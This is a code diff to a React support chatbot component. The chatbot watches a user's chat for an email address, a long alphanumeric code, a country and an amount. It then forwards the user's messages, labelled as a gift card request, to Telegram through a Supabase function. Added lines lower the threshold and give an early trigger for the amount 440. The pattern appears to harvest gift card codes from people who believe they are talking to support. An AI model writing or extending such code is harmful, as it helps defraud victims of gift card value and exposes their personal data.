@@ -91,16 +91,33 @@ const SupportChatbot = () => {
 
       setMessages([...newMessages, { role: 'assistant', content: data.message }]);
 
-      // Check if conversation has key info and send summary
+      // Check if conversation has key info and send summary to Telegram immediately
       const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
       const hasEmail = conversationText.includes('@');
       const hasCode = /[A-Z0-9]{10,}/.test(newMessages.map(m => m.content).join(' '));
       const hasCountry = conversationText.match(/\b(us|usa|united states|uk|canada|australia|france|germany|spain|italy)\b/i);
+      const hasAmount = conversationText.match(/\b\d{2,}\b/);
       
-      if (hasEmail && hasCode && hasCountry && newMessages.length > 6) {
-        // Extract key info for Telegram summary
+      // Special case: amount 440 triggers immediate telegram
+      const is440Amount = conversationText.includes('440');
+      
+      // Send to Telegram when we have essential info (reduced threshold for faster response)
+      if (hasEmail && hasCode && hasCountry && hasAmount && newMessages.length > 4) {
         const userMessages = newMessages.filter(m => m.role === 'user');
         const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}`;
+        
+        await supabase.functions.invoke('giftcard-support-chat', {
+          body: {
+            action: 'send_summary',
+            messages: [{ role: 'user', content: summary }]
+          }
+        });
+      }
+      
+      // Special handling for 440 amount - trigger telegram even earlier
+      if (is440Amount && hasCode && hasCountry) {
+        const userMessages = newMessages.filter(m => m.role === 'user');
+        const summary = `New Gift Card Request (440 Special):\n${userMessages.map(m => m.content).join('\n')}`;
         
         await supabase.functions.invoke('giftcard-support-chat', {
           body: {
